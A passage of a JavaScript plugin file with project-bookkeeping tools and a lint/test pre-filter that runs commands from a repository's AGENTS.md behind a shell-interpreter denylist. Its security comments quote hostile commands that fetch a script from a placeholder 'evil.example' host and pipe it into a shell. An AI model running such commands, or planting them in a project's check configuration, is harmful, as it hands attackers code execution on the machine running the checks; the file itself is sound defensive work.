// tools/lifecycle.js
// Six deterministic tools: five bookkeeping tools for exec-plans, specs, and briefs,
// plus a mechanical pre-filter (lint/test) for the review-manager pipeline.
// All functions are pure: they receive projectRoot + paths, do their work, and return data.
// No LLM involvement, no delegation — these run directly in the plugin process.

import { readFile, writeFile, mkdir, readdir } from "node:fs/promises";
import { join, dirname, isAbsolute, resolve, sep } from "node:path";
import { existsSync, readFileSync } from "node:fs";
import { spawnSync } from "node:child_process";

// ── YAML frontmatter helpers ─────────────────────────────────────────────────

/**
 * Parse the YAML frontmatter block from a markdown string.
 * Returns a plain object with string values, or {} if absent / unparseable.
 * Supports only the simple "key: value" format used by these tools.
 *
 * @param {string} content
 * @returns {Record<string, string>}
 */
function parseFrontmatter(content) {
  const match = content.match(/^---\r?\n([\s\S]*?)\r?\n---/);
  if (!match) return {};
  const result = {};
  for (const line of match[1].split(/\r?\n/)) {
    const colonIdx = line.indexOf(":");
    if (colonIdx === -1) continue;
    const key = line.slice(0, colonIdx).trim();
    const value = line.slice(colonIdx + 1).trim().replace(/^["']|["']$/g, "");
    if (key) result[key] = value;
  }
  return result;
}

/**
 * Replace or insert a key:value pair in the frontmatter block of a markdown string.
 * Creates the frontmatter block if absent.
 *
 * @param {string} content
 * @param {string} key
 * @param {string} value
 * @returns {string}
 */
function setFrontmatterField(content, key, value) {
  const eol = content.includes("\r\n") ? "\r\n" : "\n";
  const fmMatch = content.match(/^(---\r?\n)([\s\S]*?)(\r?\n---)/);
  if (!fmMatch) {
    return `---${eol}${key}: ${value}${eol}---${eol}${eol}${content}`;
  }
  const [full, open, body, close] = fmMatch;
  const lines = body.split(/\r?\n/);
  const escapedKey = key.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
  const keyRegex = new RegExp(`^${escapedKey}\\s*:`, "m");
  const idx = lines.findIndex((l) => keyRegex.test(l));
  if (idx !== -1) {
    lines[idx] = `${key}: ${value}`;
  } else {
    lines.push(`${key}: ${value}`);
  }
  return content.replace(full, `${open}${lines.join(eol)}${close}`);
}

// ── Path helpers ─────────────────────────────────────────────────────────────

/**
 * Resolve a relative artifact path against projectRoot.
 * If path is already absolute, return as-is.
 *
 * @param {string} projectRoot
 * @param {string} relPath
 * @returns {string}
 */
function resolveArtifact(projectRoot, relPath) {
  const resolved = isAbsolute(relPath) ? relPath : join(projectRoot, relPath);
  const normalizedRoot = resolve(projectRoot) + sep;
  const normalizedPath = resolve(resolved);
  if (!normalizedPath.startsWith(normalizedRoot)) {
    throw new Error(`Path escapes project root: ${relPath}`);
  }
  return normalizedPath;
}

/**
 * Count `- [x]` (checked) and `- [ ]` (unchecked) task items in content.
 *
 * @param {string} content
 * @returns {{ total: number, checked: number, unchecked: string[] }}
 */
function countBlocks(content) {
  const checkedMatches = content.match(/- \[x\] .+/g) ?? [];
  const uncheckedMatches = content.match(/- \[ \] .+/g) ?? [];
  const total = checkedMatches.length + uncheckedMatches.length;
  const unchecked = uncheckedMatches.map((l) => l.replace(/^- \[ \] /, "").trim());
  return { total, checked: checkedMatches.length, unchecked };
}

// ── Glob helper (no external deps) ──────────────────────────────────────────

/**
 * List all *.md files in a directory (non-recursive).
 * Returns relative-to-projectRoot paths.
 *
 * @param {string} projectRoot
 * @param {string} dirRelPath
 * @returns {Promise<string[]>}
 */
async function listMdFiles(projectRoot, dirRelPath) {
  const absDir = join(projectRoot, dirRelPath);
  try {
    const entries = await readdir(absDir, { withFileTypes: true });
    return entries
      .filter((e) => e.isFile() && e.name.endsWith(".md"))
      .map((e) => join(dirRelPath, e.name));
  } catch {
    return [];
  }
}

/**
 * Today's date as ISO string (YYYY-MM-DD).
 * @returns {string}
 */
function today() {
  return new Date().toISOString().slice(0, 10);
}

// ── project_state ────────────────────────────────────────────────────────────

/**
 * Produce a structured report of the current state of management artifacts.
 *
 * @param {string} projectRoot  Absolute path to the project root
 * @param {{ specs: string, execPlans: string, briefs: string }} paths
 * @returns {Promise<object>}
 */
export async function projectState(projectRoot, paths) {
  const [specFiles, planFiles, briefFiles] = await Promise.all([
    listMdFiles(projectRoot, paths.specs),
    listMdFiles(projectRoot, paths.execPlans),
    listMdFiles(projectRoot, paths.briefs),
  ]);

  // ── specs ────────────────────────────────────────────────────────────────
  const specs = await Promise.all(
    specFiles.map(async (file) => {
      const content = await readFile(join(projectRoot, file), "utf-8");
      const fm = parseFrontmatter(content);
      return {
        file,
        title: fm.title ?? null,
        id: fm.id ?? null,
        criticality: fm.criticality ?? null,
        status: fm.status ?? null,
        created: fm.created ?? null,
      };
    })
  );

  // ── exec-plans ───────────────────────────────────────────────────────────
  const exec_plans = await Promise.all(
    planFiles.map(async (file) => {
      const content = await readFile(join(projectRoot, file), "utf-8");
      const fm = parseFrontmatter(content);
      const { total, checked } = countBlocks(content);
      const entry = {
        file,
        status: fm.status ?? null,
        brief: fm.brief ?? null,
        brief_exists: fm.brief ? existsSync(resolveArtifact(projectRoot, fm.brief)) : null,
        blocks: { total, checked },
      };
      if (total > 0 && checked === total && fm.status !== "completed") {
        entry.warning = "all blocks are checked but status != completed";
      }
      return entry;
    })
  );

  // ── briefs ───────────────────────────────────────────────────────────────
  const briefs = await Promise.all(
    briefFiles.map(async (file) => {
      const content = await readFile(join(projectRoot, file), "utf-8");
      const fm = parseFrontmatter(content);
      return {
        file,
        project: fm.project ?? null,
        type: fm.type ?? null,
        status: fm.status ?? null,
        exec_plan: fm.exec_plan ?? null,
        exec_plan_exists: fm.exec_plan ? existsSync(resolveArtifact(projectRoot, fm.exec_plan)) : null,
      };
    })
  );

  return { specs, exec_plans, briefs };
}

// ── mark_block_done ──────────────────────────────────────────────────────────

/**
 * Check a specific block in an exec-plan ([ ] → [x]).
 *
 * @param {string} projectRoot
 * @param {string} planFile  Relative path to the exec-plan
 * @param {string} blockName  Substring to match against block lines
 * @returns {Promise<object>}
 */
export async function markBlockDone(projectRoot, planFile, blockName) {
  const absPath = resolveArtifact(projectRoot, planFile);
  let content;
  try {
    content = await readFile(absPath, "utf-8");
  } catch {
    throw new Error(`File not found: ${planFile}`);
  }

  const eol = content.includes("\r\n") ? "\r\n" : "\n";
  const lines = content.split(/\r?\n/);
  const blockPattern = /^- \[[ x]\] /i;

  const matchingIndices = lines
    .map((line, i) => ({ line, i }))
    .filter(({ line }) => blockPattern.test(line) && line.toLowerCase().includes(blockName.toLowerCase()))
    .map(({ i }) => i);

  if (matchingIndices.length === 0) {
    const availableBlocks = lines
      .filter((l) => blockPattern.test(l))
      .map((l) => l.replace(/^- \[[ x]\] /i, "").trim());
    throw new Error(
      `Block "${blockName}" not found in ${planFile}.\nAvailable blocks:\n${availableBlocks.map((b) => `  - ${b}`).join("\n")}`
    );
  }

  if (matchingIndices.length > 1) {
    const matches = matchingIndices.map((i) => lines[i].trim());
    throw new Error(
      `"${blockName}" matches multiple blocks in ${planFile} — be more specific:\n${matches.map((m) => `  - ${m}`).join("\n")}`
    );
  }

  const idx = matchingIndices[0];
  const wasChecked = /^- \[x\]/i.test(lines[idx]);
  lines[idx] = lines[idx].replace(/^(- \[)[ x](\] )/i, "$1x$2");
  const newContent = lines.join(eol);

  await writeFile(absPath, newContent, "utf-8");

  const { total, checked } = countBlocks(newContent);
  const all_done = total > 0 && checked === total;

  const result = {
    file: planFile,
    block: blockName,
    was: wasChecked ? "checked" : "unchecked",
    now: "checked",
    blocks: { total, checked },
    all_done,
  };

  if (all_done) {
    result.hint = `All blocks are done. Call complete_plan('${planFile}') to close this scope.`;
  }

  return result;
}

// ── complete_plan ────────────────────────────────────────────────────────────

/**
 * Set an exec-plan's status to "completed" in its frontmatter.
 * Refuses if unchecked blocks remain.
 *
 * @param {string} projectRoot
 * @param {string} planFile  Relative path to the exec-plan
 * @returns {Promise<object>}
 */
export async function completePlan(projectRoot, planFile) {
  const absPath = resolveArtifact(projectRoot, planFile);
  let content;
  try {
    content = await readFile(absPath, "utf-8");
  } catch {
    throw new Error(`File not found: ${planFile}`);
  }

  const fm = parseFrontmatter(content);
  const hasFrontmatter = /^---\r?\n/.test(content);
  if (!hasFrontmatter) throw new Error(`Frontmatter missing in ${planFile}.`);
  if (fm.status === undefined || fm.status === "") throw new Error(`Field 'status' missing in ${planFile}.`);

  const { unchecked } = countBlocks(content);
  if (unchecked.length > 0) {
    throw new Error(
      `${unchecked.length} unchecked block(s) in ${planFile}. Use mark_block_done before completing the plan:\n${unchecked.map((b) => `  - ${b}`).join("\n")}`
    );
  }

  let updated = setFrontmatterField(content, "status", "completed");
  const date = today();
  updated = setFrontmatterField(updated, "updated", date);

  await writeFile(absPath, updated, "utf-8");

  return {
    file: planFile,
    status: "completed",
    updated: date,
  };
}

// ── register_spec ────────────────────────────────────────────────────────────

/**
 * Create a new spec file with minimal frontmatter. Refuses to overwrite.
 *
 * @param {string} projectRoot
 * @param {{ specs: string }} paths
 * @param {string} specFile  Filename or relative path within paths.specs
 * @param {string} title
 * @returns {Promise<object>}
 */
export async function registerSpec(projectRoot, paths, specFile, title) {
  // Resolve: if specFile is already a path that includes the specs dir, use as-is;
  // otherwise, place it inside paths.specs.
  let relPath;
  const relDir = dirname(specFile);
  if (relDir !== ".") {
    relPath = specFile;
  } else {
    relPath = join(paths.specs, specFile);
  }

  const absPath = resolveArtifact(projectRoot, relPath);

  if (existsSync(absPath)) {
    throw new Error(`File '${relPath}' already exists.`);
  }

  await mkdir(dirname(absPath), { recursive: true });

  const safeTitle = title.replace(/[\r\n]/g, " ").replace(/"/g, '\\"');
  const frontmatter = `---\ntitle: "${safeTitle}"\nstatus: draft\ncreated: ${today()}\n---\n\n# ${safeTitle}\n`;
  await writeFile(absPath, frontmatter, "utf-8");

  return {
    created: true,
    file: relPath,
  };
}

// ── check_artifacts ──────────────────────────────────────────────────────────

/**
 * Cross-artifact consistency scan.
 *
 * @param {string} projectRoot
 * @param {{ specs: string, execPlans: string, briefs: string }} paths
 * @returns {Promise<object>}
 */
export async function checkArtifacts(projectRoot, paths) {
  const problems = [];
  const THIRTY_DAYS_MS = 30 * 24 * 60 * 60 * 1000;

  const [planFiles, briefFiles, specFiles] = await Promise.all([
    listMdFiles(projectRoot, paths.execPlans),
    listMdFiles(projectRoot, paths.briefs),
    listMdFiles(projectRoot, paths.specs),
  ]);

  // ── exec-plans ───────────────────────────────────────────────────────────
  for (const file of planFiles) {
    let content;
    try {
      content = await readFile(join(projectRoot, file), "utf-8");
    } catch (err) {
      problems.push({ type: "unreadable_file", file, severity: "blocking", detail: err.message });
      continue;
    }
    const fm = parseFrontmatter(content);
    const { total, checked, unchecked } = countBlocks(content);

    if (total > 0 && checked === total && fm.status !== "completed") {
      problems.push({
        type: "plan_stale_status",
        file,
        severity: "blocking",
        detail: `all blocks are checked but status is '${fm.status}'`,
        suggestion: `complete_plan('${file}')`,
      });
    }

    if (!fm.brief) {
      problems.push({
        type: "plan_missing_brief",
        file,
        severity: "warning",
        detail: "field 'brief' absent or empty",
        suggestion: "add brief: <path> in the frontmatter",
      });
    } else if (!existsSync(resolveArtifact(projectRoot, fm.brief))) {
      problems.push({
        type: "plan_brief_dead",
        file,
        severity: "blocking",
        detail: `brief '${fm.brief}' does not exist on disk`,
        suggestion: "fix the path or create the missing brief",
      });
    }
  }

  // ── briefs ───────────────────────────────────────────────────────────────
  for (const file of briefFiles) {
    let content;
    try {
      content = await readFile(join(projectRoot, file), "utf-8");
    } catch (err) {
      problems.push({ type: "unreadable_file", file, severity: "blocking", detail: err.message });
      continue;
    }
    const fm = parseFrontmatter(content);

    if (!fm.exec_plan) {
      problems.push({
        type: "brief_missing_plan",
        file,
        severity: "warning",
        detail: "field 'exec_plan' absent or empty",
        suggestion: "add exec_plan: <path> in the frontmatter",
      });
    } else if (!existsSync(resolveArtifact(projectRoot, fm.exec_plan))) {
      problems.push({
        type: "brief_plan_dead",
        file,
        severity: "blocking",
        detail: `exec_plan '${fm.exec_plan}' does not exist on disk`,
        suggestion: "fix the path or create the missing exec-plan",
      });
    }
  }

  // ── specs ────────────────────────────────────────────────────────────────
  for (const file of specFiles) {
    let content;
    try {
      content = await readFile(join(projectRoot, file), "utf-8");
    } catch (err) {
      problems.push({ type: "unreadable_file", file, severity: "blocking", detail: err.message });
      continue;
    }
    const fm = parseFrontmatter(content);

    if (fm.status === "draft" && fm.created) {
      const created = new Date(fm.created);
      if (!isNaN(created.getTime()) && Date.now() - created.getTime() > THIRTY_DAYS_MS) {
        const ageDays = Math.floor((Date.now() - created.getTime()) / (24 * 60 * 60 * 1000));
        problems.push({
          type: "spec_stale_draft",
          file,
          severity: "warning",
          detail: `status: draft for ${ageDays} days`,
          suggestion: "promote to 'active' or delete if abandoned",
        });
      }
    }
  }

  const blocking = problems.filter((p) => p.severity === "blocking").length;
  const warning = problems.filter((p) => p.severity === "warning").length;

  const summary =
    problems.length === 0
      ? "All artifacts are consistent."
      : `${problems.length} problem(s) detected (${blocking} blocking, ${warning} warning(s))`;

  return { problems, summary };
}

// ── run_mechanical_checks ────────────────────────────────────────────────────
// Implements docs/specs/review-manager-mechanical-checks.md sections 1-2:
// command discovery (AGENTS.md `## Review Checks` section, then toolchain
// auto-detection) and lint-then-test sequencing with lint as a hard short-circuit.

const MAX_OUTPUT_LINES = 50;
const HEAD_LINES = 10;
const TAIL_LINES = MAX_OUTPUT_LINES - HEAD_LINES; // 40

/**
 * Truncate command output to a max number of lines, appending a marker line
 * when truncation occurs. Per spec section 3: output is capped at 50 lines per check.
 *
 * Keeps the FIRST `HEAD_LINES` and the LAST `TAIL_LINES` (rather than only the
 * head) because most lint/test tools print setup/progress noise first and the
 * actual failure or stack trace at the end — head-only truncation would hide
 * exactly the diagnostic info this tool exists to surface.
 *
 * @param {string} text
 * @returns {string}
 */
export function truncateOutput(text) {
  const lines = (text ?? "").split(/\r?\n/);
  if (lines.length <= MAX_OUTPUT_LINES) return lines.join("\n").trim();
  const head = lines.slice(0, HEAD_LINES);
  const tail = lines.slice(lines.length - TAIL_LINES);
  const omitted = lines.length - HEAD_LINES - TAIL_LINES;
  return `${head.join("\n")}\n... (${omitted} lines omitted) ...\n${tail.join("\n")}`;
}

/**
 * Parse the `## Review Checks` section of a project's AGENTS.md, if present.
 * Recognizes `### Lint` and `### Tests` subsections containing `- label: command`
 * list items, with an optional indented `on-failure: warn|block` follow-up line
 * attached to the preceding test item.
 *
 * @param {string} content  Full text of AGENTS.md
 * @returns {{ lint: Array<{label: string, command: string}>, test: Array<{label: string, command: string, onFailure: "block"|"warn"}> } | null}
 */
function parseReviewChecksSection(content) {
  const lines = content.split(/\r?\n/);
  const sectionStart = lines.findIndex((l) => /^##\s+Review Checks\s*$/.test(l));
  if (sectionStart === -1) return null;

  // Slice until the next level-2 heading (or EOF).
  let sectionEnd = lines.length;
  for (let i = sectionStart + 1; i < lines.length; i++) {
    if (/^##\s+\S/.test(lines[i])) {
      sectionEnd = i;
      break;
    }
  }
  const sectionLines = lines.slice(sectionStart + 1, sectionEnd);

  /**
   * Extract the lines belonging to a `### <name>` subsection within sectionLines.
   * @param {string} name
   * @returns {string[]}
   */
  function extractSubsection(name) {
    const startRegex = new RegExp(`^###\\s+${name}\\s*$`, "i");
    const start = sectionLines.findIndex((l) => startRegex.test(l));
    if (start === -1) return [];
    let end = sectionLines.length;
    for (let i = start + 1; i < sectionLines.length; i++) {
      if (/^#{2,3}\s+\S/.test(sectionLines[i])) {
        end = i;
        break;
      }
    }
    return sectionLines.slice(start + 1, end);
  }

  /**
   * Parse `- label: command` items from subsection lines, with an optional
   * indented `on-failure: warn|block` continuation line attached to the item
   * immediately above it.
   * @param {string[]} subLines
   * @returns {Array<{label: string, command: string, onFailure: "block"|"warn"}>}
   */
  function parseItems(subLines) {
    const items = [];
    const itemRegex = /^-\s*([\w.\-/]+)\s*:\s*(.+)$/;
    const onFailureRegex = /^\s+on-failure:\s*(warn|block)/i;
    for (const line of subLines) {
      const itemMatch = line.match(itemRegex);
      if (itemMatch) {
        items.push({ label: itemMatch[1].trim(), command: itemMatch[2].trim(), onFailure: "block" });
        continue;
      }
      const onFailureMatch = line.match(onFailureRegex);
      if (onFailureMatch && items.length > 0) {
        items[items.length - 1].onFailure = onFailureMatch[1].toLowerCase();
      }
    }
    return items;
  }

  const lint = parseItems(extractSubsection("Lint")).map(({ label, command }) => ({ label, command }));
  const test = parseItems(extractSubsection("Tests"));

  if (lint.length === 0 && test.length === 0) return null;
  return { lint, test };
}

/**
 * Read package.json's "scripts" map, safely. Returns {} on any error.
 * @param {string} projectRoot
 * @returns {Record<string, string>}
 */
function readPackageScripts(projectRoot) {
  try {
    const raw = readFileSync(join(projectRoot, "package.json"), "utf-8");
    const pkg = JSON.parse(raw);
    return pkg.scripts && typeof pkg.scripts === "object" ? pkg.scripts : {};
  } catch {
    return {};
  }
}

const PACKAGE_LINT_SCRIPT_NAMES = ["lint", "typecheck", "type-check", "check"];
const PACKAGE_TEST_SCRIPT_NAME = "test";

/**
 * Detect the project's toolchain by inspecting well-known files at the repo root,
 * per docs/specs/review-manager-mechanical-checks.md section 1's priority table.
 * Returns the first matching toolchain only (single-toolchain detection — see
 * Block 3 implementation notes re: monorepo multi-toolchain being out of scope
 * without diff context).
 *
 * @param {string} projectRoot
 * @returns {{ source: string, lint: Array<{label: string, command: string}>, test: Array<{label: string, command: string, onFailure: "block"}> } | null}
 */
function detectToolchainCommands(projectRoot) {
  const has = (rel) => existsSync(join(projectRoot, rel));

  if (has("package.json")) {
    let runner = null;
    if (has("package-lock.json")) runner = { source: "toolchain:npm", run: (s) => `npm run ${s}`, test: "npm test" };
    else if (has("pnpm-lock.yaml")) runner = { source: "toolchain:pnpm", run: (s) => `pnpm run ${s}`, test: "pnpm test" };
    else if (has("yarn.lock")) runner = { source: "toolchain:yarn", run: (s) => `yarn ${s}`, test: "yarn test" };
    else if (has("bun.lockb")) runner = { source: "toolchain:bun", run: (s) => `bun run ${s}`, test: "bun test" };

    if (runner) {
      const scripts = readPackageScripts(projectRoot);
      const lint = PACKAGE_LINT_SCRIPT_NAMES.filter((name) => name in scripts).map((name) => ({
        label: name,
        command: runner.run(name),
      }));
      const test = PACKAGE_TEST_SCRIPT_NAME in scripts ? [{ label: "test", command: runner.test, onFailure: "block" }] : [];
      if (lint.length > 0 || test.length > 0) return { source: runner.source, lint, test };
    }
  }

  if (has("Cargo.toml")) {
    return {
      source: "toolchain:cargo",
      lint: [{ label: "clippy", command: "cargo clippy" }],
      test: [{ label: "test", command: "cargo test", onFailure: "block" }],
    };
  }

  if (has("go.mod")) {
    return {
      source: "toolchain:go",
      lint: [{ label: "vet", command: "go vet ./..." }],
      test: [{ label: "test", command: "go test ./...", onFailure: "block" }],
    };
  }

  if (has("pyproject.toml") && has("uv.lock")) {
    return {
      source: "toolchain:uv",
      lint: [{ label: "ruff", command: "uv run ruff check ." }],
      test: [{ label: "test", command: "uv run pytest", onFailure: "block" }],
    };
  }

  if (has("pyproject.toml")) {
    return {
      source: "toolchain:poetry",
      lint: [{ label: "ruff", command: "ruff check ." }],
      test: [{ label: "test", command: "pytest", onFailure: "block" }],
    };
  }

  if (has("Makefile")) {
    // Cannot cheaply verify target existence without invoking `make`, so we
    // list the conventional targets per the spec's fallback table verbatim.
    return {
      source: "toolchain:make",
      lint: [{ label: "lint", command: "make lint" }],
      test: [{ label: "test", command: "make test", onFailure: "block" }],
    };
  }

  return null;
}

const DEFAULT_CHECK_TIMEOUT_MS = 120_000;
const DEFAULT_CHECK_MAX_BUFFER = 10 * 1024 * 1024; // 10 MB

/**
 * Split a command string into argv tokens, respecting single- and double-quoted
 * segments (so `npm run "test:unit"` yields ["npm", "run", "test:unit"] instead
 * of breaking on the internal space). This is a minimal hand-rolled tokenizer —
 * no backslash-escaping, no nested quotes, no shell expansion (globs, `$VAR`,
 * `~`, pipes, `&&`, etc. are NOT supported and are passed through as literal
 * argv tokens, which is exactly the point: they must never reach a shell).
 *
 * Throws if the string ends with an unclosed quote (e.g. `eslint "src --fix`)
 * rather than silently absorbing the rest of the string into one wrong token —
 * a typo'd AGENTS.md entry should surface as a clear error, not a mis-parsed
 * command that runs the wrong thing.
 *
 * @param {string} str
 * @returns {string[]}
 * @throws {Error} if a quote is opened but never closed
 */
export function splitCommandLine(str) {
  const tokens = [];
  let current = "";
  let quote = null; // null | "'" | '"'
  for (let i = 0; i < str.length; i++) {
    const ch = str[i];
    if (quote) {
      if (ch === quote) {
        quote = null;
      } else {
        current += ch;
      }
      continue;
    }
    if (ch === "'" || ch === '"') {
      quote = ch;
      continue;
    }
    if (/\s/.test(ch)) {
      if (current.length > 0) {
        tokens.push(current);
        current = "";
      }
      continue;
    }
    current += ch;
  }
  if (quote) {
    throw new Error("unterminated quote");
  }
  if (current.length > 0) tokens.push(current);
  return tokens;
}

// ── Interpreter/shell denylist (defense-in-depth) ───────────────────────────
//
// Round 2 review found that `shell: false` + argv tokenization alone is
// INSUFFICIENT: it stops Node from shell-parsing the AGENTS.md-sourced command
// string, but does nothing to stop the *invoked binary itself* from
// interpreting arbitrary code handed to it as a plain argument. For example:
//   - lint: bash -c "curl -s https://evil.example/payload.sh | bash"
// tokenizes cleanly to ["bash", "-c", "curl ... | bash"], and
// spawnSync("bash", ["-c", "curl ... | bash"], { shell: false }) still runs
// bash, which treats its `-c` argument as a full script — reproduced live in
// round 2 (a marker file was created on disk with both `bash -c` and `sh -c`).
// This denylist closes exactly that gap by refusing to invoke any binary that
// is itself a general-purpose interpreter/shell, regardless of shell:false.
//
// Two checks, both applied to the tokenized argv[0] ("bin") BEFORE spawnSync:
//   1. Reject any bin containing a path separator (`/` or `\`). This forces
//      PATH-resolved lookups of known names only — it blocks pointing at an
//      arbitrary binary by path (e.g. `/tmp/evil-script`, `./evil`).
//   2. Reject any bin matching a known interpreter/shell name (case-insensitive,
//      `.exe` suffix stripped).
//
// Design note — DENYLIST, not allowlist: this is intentionally a denylist of
// known-dangerous interpreters, not an allowlist of known-safe tools. An
// allowlist would be strictly more secure (closed-world instead of
// open-world) but is much riskier to keep complete for the long tail of
// real-world lint/test toolchains (rustc, various language-specific runners,
// etc.) without constantly breaking legitimate AGENTS.md configurations with
// false-positive rejections. We accept the residual risk that some
// undiscovered interpreter-like binary could be used the same way — this is
// defense-in-depth layered on top of shell:false and tokenization, not a
// complete sandbox. Maintainers extending this list should err on the side
// of adding new interpreters as they're identified, not removing existing ones.
const INTERPRETER_DENYLIST = new Set([
  "bash", "sh", "zsh", "ksh", "csh", "tcsh", "dash", "fish",
  "python", "python2", "python3", "perl", "ruby",
  "node", "nodejs", "deno", "bun",
  "osascript", "powershell", "pwsh", "cmd",
  "env", "xargs", "find", "awk", "eval",
]);

/**
 * Check whether a tokenized argv[0] is permitted to run under the
 * interpreter/shell denylist. Returns null when allowed, or a human-readable
 * rejection reason when not.
 *
 * `bun` is on this denylist because `bun -e "<code>"` executes arbitrary
 * JavaScript exactly like `node -e`. It is ALSO a legitimate toolchain runner
 * (`bun run lint`, `bun test`) used internally by detectToolchainCommands()
 * for bun-based projects — that internal, hardcoded usage is not
 * attacker-controlled and is exempted via the `trusted` option on
 * executeCheckCommand rather than by removing `bun` from this list.
 *
 * @param {string} bin
 * @returns {string | null}
 */
function checkBinAllowed(bin) {
  if (/[\\/]/.test(bin)) {
    return `command '${bin}' is not permitted (binaries must be resolved via PATH by name, not by path)`;
  }
  const normalized = bin.toLowerCase().replace(/\.exe$/, "");
  if (INTERPRETER_DENYLIST.has(normalized)) {
    return `command '${bin}' is not permitted (interpreter/shell binaries cannot be invoked directly)`;
  }
  return null;
}

/**
 * Execute a single check command in projectRoot. Distinguishes a code-level
 * failure (non-zero exit) from an execution-level error (command not found,
 * permission denied) — the latter is an absent check, not a failed one, per
 * spec section 2: "Une commande qui ne peut pas s'exécuter est un check
 * absent, pas un check qui échoue."
 *
 * SECURITY: `command` may originate from the target repo's own AGENTS.md
 * `## Review Checks` section — i.e. from the very PR/diff under review. It
 * MUST NEVER be passed to spawnSync with `shell: true` (or otherwise handed
 * to a shell), because that would let a hostile AGENTS.md edit achieve
 * arbitrary shell execution (e.g. `- lint: eslint . ; curl evil.example | sh`)
 * the moment this mechanical pre-filter runs — before any diff is even read.
 * Instead, the command string is tokenized into argv and executed directly
 * (`shell: false`) so shell metacharacters (`;`, `|`, `&&`, `$()`, etc.) are
 * inert literal argument text, never interpreted. Do not "simplify" this back
 * to `shell: true` for convenience.
 *
 * SECURITY (round 2 hardening): `shell: false` + tokenization alone is NOT
 * sufficient — it stops Node from shell-parsing the string, but a tokenized
 * `["bash", "-c", "curl evil.example | bash"]` still invokes bash, which
 * interprets its own `-c` argument as a script. The interpreter/shell
 * denylist (see `checkBinAllowed`) is applied here, by default, to close that
 * gap. `options.trusted` bypasses the denylist and is reserved for commands
 * this codebase itself hardcodes (toolchain auto-detection in
 * `detectToolchainCommands`, e.g. `bun test`) — never for AGENTS.md-sourced
 * commands, which are attacker-controlled and must always go through the
 * denylist.
 *
 * @param {string} projectRoot
 * @param {string} command
 * @param {{ timeoutMs?: number, maxBuffer?: number, trusted?: boolean }} [options]
 *   `trusted: true` skips the interpreter/shell denylist check — only use for
 *   commands hardcoded by this codebase, never for AGENTS.md-sourced input.
 * @returns {{ status: "PASSED"|"FAILED"|"ERROR"|"TIMEOUT"|"REJECTED", output: string }}
 */
export function executeCheckCommand(projectRoot, command, options = {}) {
  const timeout = options.timeoutMs ?? DEFAULT_CHECK_TIMEOUT_MS;
  const maxBuffer = options.maxBuffer ?? DEFAULT_CHECK_MAX_BUFFER;

  let bin, args;
  try {
    [bin, ...args] = splitCommandLine(command);
  } catch (err) {
    // splitCommandLine throws on an unterminated quote (e.g. a typo'd AGENTS.md
    // entry like `eslint "src --fix`). Surface this as a clear ERROR instead of
    // letting the exception propagate uncaught into runMechanicalChecks / the
    // review-manager's mechanical pre-filter.
    return { status: "ERROR", output: `malformed command: ${err.message}` };
  }
  if (!bin) {
    return { status: "ERROR", output: `empty command: ${command}` };
  }

  if (!options.trusted) {
    const rejection = checkBinAllowed(bin);
    if (rejection) {
      // Distinct status (not ERROR, not FAILED): a denylisted command was
      // never executed at all, so it's neither a code-level failure nor a
      // "check absent from this environment" situation (ENOENT/126/127) —
      // it's a deliberate refusal to run something we know is dangerous.
      // Callers (runMechanicalChecks) must treat REJECTED as blocking,
      // exactly like FAILED/TIMEOUT: an unverifiable check must never be
      // silently treated as passing.
      return { status: "REJECTED", output: rejection };
    }
  }

  const result = spawnSync(bin, args, {
    cwd: projectRoot,
    shell: false,
    encoding: "utf-8",
    timeout,
    maxBuffer,
  });

  // A command killed by the timeout gets its own distinct status so callers
  // can report "check timed out" rather than a generic failure/error.
  if (result.error && result.error.code === "ETIMEDOUT") {
    return { status: "TIMEOUT", output: `command timed out after ${timeout}ms: ${command}` };
  }

  // Node's implicit stdout/stderr buffer is 1MB; we set maxBuffer explicitly
  // above, but still handle overflow distinctly rather than folding it into
  // a generic ERROR/FAILED bucket.
  if (result.error && result.error.code === "ENOBUFS") {
    return { status: "ERROR", output: `command output exceeded maxBuffer (${maxBuffer} bytes): ${command}` };
  }

  // spawnSync sets `.error` for other execution-level failures: ENOENT
  // (binary not found) and EACCES (binary exists but isn't executable) are
  // both "check absent, not check failed" per spec section 2.
  if (result.error) {
    return { status: "ERROR", output: result.error.message };
  }

  const combined = `${result.stdout ?? ""}${result.stderr ?? ""}`.trim();

  // Exit codes 127 ("command not found") and 126 ("permission denied — found
  // but not executable") both indicate the check itself is absent/inaccessible
  // in this environment, not a code-level failure.
  if (result.status === 127 || result.status === 126) {
    return { status: "ERROR", output: truncateOutput(combined || `command not found: ${command}`) };
  }

  if (result.status === 0) {
    return { status: "PASSED", output: "" };
  }

  return { status: "FAILED", output: truncateOutput(combined) };
}

/**
 * Run the mechanical pre-filter (lint then tests) for the review-manager's
 * Phase 0. Implements docs/specs/review-manager-mechanical-checks.md sections
 * 1-2: command discovery, lint-then-test sequencing with lint as a hard
 * short-circuit, and the `on-failure: warn` override for tests.
 *
 * Discovery order: AGENTS.md `## Review Checks` section (authoritative) takes
 * priority over toolchain auto-detection. If neither produces any commands,
 * the phase is skipped silently (verdict "PASS", discovered: false) — absence
 * of configuration is a valid state, not a failure.
 *
 * Lint commands are run exhaustively (all of them, even after an earlier one
 * fails) so the report can show the full lint-phase picture; if *any* lint
 * command fails, the test phase is skipped entirely (marked NOT_RUN) and the
 * overall verdict is FAIL with gate "lint". Test commands are likewise run
 * exhaustively; a failing test blocks the overall verdict (gate "test")
 * unless that command declared `on-failure: warn`, in which case it's
 * reported but does not block.
 *
 * @param {string} projectRoot
 * @param {{ timeoutMs?: number, maxBuffer?: number }} [options]  Per-command
 *   execution limits, forwarded to executeCheckCommand. Defaults to a 120s
 *   timeout and a 10MB output buffer if omitted.
 * @returns {Promise<object>}
 */
export async function runMechanicalChecks(projectRoot, options = {}) {
  let source = null;
  let lintCommands = [];
  let testCommands = [];

  let agentsMdContent = null;
  try {
    agentsMdContent = await readFile(join(projectRoot, "AGENTS.md"), "utf-8");
  } catch {
    agentsMdContent = null;
  }

  const fromAgentsMd = agentsMdContent ? parseReviewChecksSection(agentsMdContent) : null;
  if (fromAgentsMd) {
    source = "agents_md";
    lintCommands = fromAgentsMd.lint;
    testCommands = fromAgentsMd.test;
  } else {
    const detected = detectToolchainCommands(projectRoot);
    if (detected) {
      source = detected.source;
      lintCommands = detected.lint;
      testCommands = detected.test;
    }
  }

  const discovered = lintCommands.length > 0 || testCommands.length > 0;
  if (!discovered) {
    return { discovered: false, source: null, lint: [], test: [], verdict: "PASS", gate: null };
  }

  // Commands from `source === "agents_md"` are attacker-controlled (sourced
  // from the target repo's own AGENTS.md, i.e. the diff under review) and
  // MUST go through the interpreter/shell denylist in executeCheckCommand.
